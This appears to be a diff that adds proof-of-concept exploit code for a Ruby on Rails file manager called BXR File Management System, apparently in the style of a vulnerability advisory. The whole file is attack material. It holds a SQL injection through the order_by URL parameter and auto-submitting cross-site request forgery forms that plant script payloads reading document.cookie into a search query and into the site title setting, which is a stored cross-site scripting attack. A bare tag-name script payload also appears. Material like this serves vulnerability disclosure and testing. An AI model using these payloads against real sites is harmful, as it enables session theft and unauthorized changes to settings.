@@ -1,0 +1,32 @@
+http://www.example.com/folder/list?order_by=filesize&#039;+SQL
+
+
+&lt;form action=&quot;http://host/search/show_results&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;search_type&quot; value=&quot;filename&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;search[query]&quot; value=&#039;1&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;commit&quot; value=&quot;Find!&quot; /&gt;
+
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+
+mytagname&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+
+&lt;form action=&quot;http://host/settings/update_settings&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;setting[site_title]&quot; value=&#039;BXR File Management System&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[site_keywords]&quot; value=&quot;BXR, Open Source File Management System&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[site_description]&quot; value=&quot;The Free, Open Source, Ruby on Rails File Management System.&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[let_users_change_default_folder]&quot; value=&quot;0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[use_ferret]&quot; value=&quot;0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[overwrite_existing_files]&quot; value=&quot;0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;commit&quot; value=&quot;Update Settings&quot; /&gt;
+
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
